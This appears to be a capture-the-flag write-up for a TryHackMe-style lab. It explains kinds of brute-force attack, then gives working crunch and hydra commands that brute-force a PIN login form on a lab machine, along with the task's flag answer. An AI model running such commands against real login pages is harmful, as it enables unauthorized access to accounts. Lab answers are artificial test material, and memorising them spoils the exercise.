<h1>Data Science in Cybersecurity</h1>

<p>
Brute forcing is a common technique used in cybersecurity for gaining unauthorized access to systems or data by trying out numerous password combinations until the correct one is found. This method involves automated software or scripts that systematically generate and test different combinations of usernames and passwords until they find the right credentials to access a system, application, or network.

There are various types of brute force attacks:

<b>Password Cracking</b>: This involves trying all possible password combinations until the correct one is discovered. Attackers use dictionaries of common passwords or generate random character combinations to crack passwords.

<b>Credential Stuffing</b>: Attackers use previously leaked usernames and passwords from one service to attempt access to other services, exploiting the fact that many people reuse passwords across multiple accounts.

<b>Dictionary Attacks</b>: Instead of trying every possible combination, attackers use a list of commonly used passwords or words commonly found in dictionaries, reducing the search space and increasing the chances of success.

<b>Hybrid Brute Force Attack</b>: This combines dictionary words with variations of characters or numbers to increase the chances of cracking a password.

</p>

<h2>Solution</h2>
<ul>
<li>Start the Machine</li>
<li>Open terminal</li>
<li>Generate 3digits.txt<br>
  crunch 3 3 0123456789ABCDEF -o 3digits.txt
</li>
<li>Use hydra to start the attack <br>
  hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
</li>
<li>enter the password obtained and enter the control system</li>
<li>Press Unlock</li>
<li>Note the Flag at the Top</li>
</ul>

<h2>Day 3 — Tasks</h2>

<h4>
1. Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?  <br>
Ans: THM{pin-code-brute-force}
</h4>
